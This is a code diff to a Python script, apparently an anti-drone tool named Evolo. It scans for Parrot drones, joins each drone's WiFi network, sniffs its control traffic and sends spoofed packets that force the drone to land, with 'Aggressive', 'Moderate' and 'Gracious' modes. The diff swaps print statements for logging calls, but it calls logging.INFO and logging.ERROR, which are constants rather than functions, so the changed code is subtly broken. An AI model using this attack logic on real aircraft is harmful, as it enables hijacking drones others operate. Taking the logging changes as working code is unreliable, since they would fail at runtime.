@@ -1,7 +1,11 @@
 from time import sleep
 import threading
+import logging
 
 from evolo import *
+
+#configurations
+logging.basicConfig(filename='logger.log',level=logging.INFO)
 
 #global constants
 interfaceForScan = "wlan0"
@@ -12,29 +16,29 @@ interfaceToConnect = "wlan1"
 ############################
 def attack(parrotsAP):
 	global attackInProgress, underattack
-	print "Attack started"
+	logging.INFO("Attack started")
 	arduinoLCD("Attack started")
-	
+
 	if not connectTo(parrotsAP, interfaceToConnect):
-		print "Could not connect to parrot at", parrotsAP.ssid, ", exiting"
+		logging.ERROR("Could not connect to parrot at", parrotsAP.ssid, ", exiting")
 		arduinoLCD("Can't connect " + parrotsAP.ssid)
 		underattack = []
 		attackInProgress = 0
 		return
-	
+
 	if attackInProgress == 2: #if panic mode started, quit
 		return
-	
+
 	wifiDistance = getWifiDistance(interfaceToConnect, parrotsAP)
-	
-	print "Succesfully connected to", parrotsAP.ssid
+
+	logging.INFO("Succesfully connected to", parrotsAP.ssid)
 	arduinoLCD("Connected to " + parrotsAP.ssid)
-	
+
 	srcMAC, dstMAC, srcIP, dstIP, segNr = sniffParrotCommunication(interfaceToConnect)
-	
+
 	if attackInProgress == 2: #if panic mode started, quit
 		return
-	
+
 	if srcMAC != "": #only attack if sniffing was successfull. Otherwise simply quit
 		if mode == "Aggressive":
 			arduinoLCD("Sending land commands")
@@ -42,23 +46,23 @@ def attack(parrotsAP):
 		elif mode == "Moderate":
 			arduinoLCD("Sending warn commands")
 			sendSpoofedParrotPacket("warn", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10)
-			print "Wait for 5 seconds"
+			logging.INFO("Wait for 5 seconds")
 			arduinoLCD("Wait 5 sec")
 			sleep(5) #original idea was 10 here, I changed it to 5 for debugging
-			print "Wait ended"
+			logging.INFO("Wait ended")
 			if attackInProgress == 2: #if panic mode started, quit
 				return
-			print "Send release packet"
+			logging.INFO("Send release packet")
 			arduinoLCD("Sending release command")
 			sendSpoofedParrotPacket("release", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, 1, 1)
-			print "Wait for 5 seconds"
+			logging.INFO("Wait for 5 seconds")
 
 			sleep(5)
-			print "Wait ended"
+			logging.INFO("Wait ended")
 			if attackInProgress == 2: #if panic mode started, quit
 				return
 			if getWifiDistance(interfaceToConnect, parrotsAP) > 0: #if the drone is still in wifi range land it
-				print "Sending land commands"
+				logging.INFO("Sending land commands")
 				arduinoLCD("Sending land commands")
 				sendSpoofedParrotPacket("land", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10)
 		elif mode == "Gracious":
@@ -71,23 +75,23 @@ def attack(parrotsAP):
 					arduinoLCD("Sending warn commands")
 					sendSpoofedParrotPacket("warn", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10)
 					sleep(10)
-					
+
 					if attackInProgress == 2: #if panic mode started, quit
 						return
-					
+
 					arduinoLCD("Sending release command")
 					sendSpoofedParrotPacket("release", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, 1, 1)
 					sleep(5)
 					if attackInProgress == 2: #if panic mode started, quit
 						return
 	else:
-		print "No communication toward parrot at ", parrotsAP.ssid, ", exiting"
+		logging.ERROR("No communication toward parrot at ", parrotsAP.ssid, ", exiting")
 		arduinoLCD("No com to " + parrotsAP.ssid)
 	#if attack finished, clean up the global variables
 	underattack = []
 	attackInProgress = 0
 	disconnectFromWifi(interfaceToConnect)
-	print "Attack finished"
+	logging.INFO("Attack finished")
 	arduinoLCD("Attack finished")
 
 ##########################################
@@ -110,13 +114,13 @@ def panicMode():
 #Program starts here#
 #####################
 if __name__ == '__main__':
-	print "Evolo has started"
+	logging.INFO("Evolo has started")
 	startArduino()
 	arduinoLCD("Evolo started")
 	disconnectFromWifi(interfaceForScan)
 	disconnectFromWifi(interfaceToConnect)
 	sleep(5)
-	print "Evolo is ready for operation"
+	logging.INFO("Evolo is ready for operation")
 	arduinoLCD("Evolo is ready")
 	global mode, Range, underattack, attackInProgress, attackT
 	underattack = []
@@ -125,7 +129,7 @@ if __name__ == '__main__':
 	Range = ""
 	while True: #scan, attack, repeat
 		mode = readKnobState()
-		print "mode: ", mode
+		logging.INFO("mode: ", mode)
 		whitelist, Range = readConfig()
 		newParrots = scanForParrots(interfaceForScan, whitelist, underattack)
 		if len(newParrots) > 0: #only work if there are new drones nearby
